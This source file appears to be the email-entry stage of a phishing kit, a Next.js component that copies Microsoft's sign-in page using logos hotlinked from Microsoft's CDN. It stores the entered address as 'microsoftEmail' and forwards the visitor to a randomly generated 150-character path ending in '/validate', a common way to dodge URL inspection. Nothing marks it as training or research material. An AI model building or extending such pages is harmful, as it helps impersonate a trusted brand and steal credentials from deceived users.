"use client"

import { useState, useEffect } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import Image from "next/image"
import { Input } from "../../components/ui/input"
import { Button } from "../../components/ui/button"

const generateRandomString = (length: number) => {
  const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}


export default function InputPage() {
  const [email, setEmail] = useState("")
  const router = useRouter()
  const searchParams = useSearchParams()

  useEffect(() => {
    const emailParam = searchParams.get('email')
    if (emailParam) {
      setEmail(decodeURIComponent(emailParam))
    }
  }, [searchParams])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    localStorage.setItem('microsoftEmail', email)
    const randomPath = generateRandomString(150)
    router.push(`/${randomPath}/validate?email=${encodeURIComponent(email)}`)
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center relative">
      {/* Background with blur */}
      <div 
        className="fixed inset-0 bg-cover bg-center"
        style={{
          backgroundImage: "url('/bg.png')",
          filter: "blur(4px)"
        }}
      />
      <div className="absolute inset-0 bg-white/30" />

      {/* Main content */}
      <div className="z-10 w-[440px] bg-white shadow-md p-11">
        <Image
          src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
          alt="Microsoft"
          width={108}
          height={24}
          className="mb-4"
        />

        <form onSubmit={handleSubmit} className="space-y-4">
          <h2 className="text-2xl font-medium">Sign in</h2>
          
          <div>
            <Input
              type="text"
              placeholder="Email, phone, or Skype"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="w-full border-b border-[#666] bg-transparent outline-none ring-0 rounded-none px-0 py-2 text-base hover:border-b-[#000] focus:border-b-2 focus:border-b-[#0067b8] focus:ring-0"
              style={{ borderTop: 0, borderLeft: 0, borderRight: 0 }}
            />
          </div>

          <div className="space-y-4 text-sm">
            <p>
              No account? <a href="#" className="text-[#0067b8] hover:text-[#004b85] hover:underline">Create one!</a>
            </p>
            <a href="#" className="text-[#0067b8] hover:text-[#004b85] hover:underline flex items-center">
              Sign in with a security key 
              <span className="ml-1 w-5 h-5 border border-black/70 rounded-full inline-flex items-center justify-center">?</span>
            </a>
          </div>

          <div className="flex justify-end pt-4">
            <Button 
              type="submit"
              className="bg-[#0067b8] hover:bg-[#004b85] text-white min-w-[108px] h-8 text-sm rounded"
            >
              Next
            </Button>
          </div>
        </form>
      </div>

      {/* Bottom section */}
      <div className="z-10 w-[440px] mt-5 bg-white shadow-md px-11 py-2 flex items-center cursor-pointer hover:bg-[#dde2d1]">
        <Image
          src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"
          alt="Sign-in options"
          width={32}
          height={32}
          className="mr-3"
        />
        <span className="text-sm">Sign-in options</span>
      </div>

      {/* Footer */}
      <footer className="fixed bottom-0 w-full p-2 flex justify-end space-x-4 text-xs">
        <a href="#" className="text-black hover:underline">Terms of use</a>
        <a href="#" className="text-black hover:underline">Privacy & cookies</a>
        <button className="text-black font-semibold tracking-[3px] mr-4">...</button>
      </footer>
    </div>
  )
}
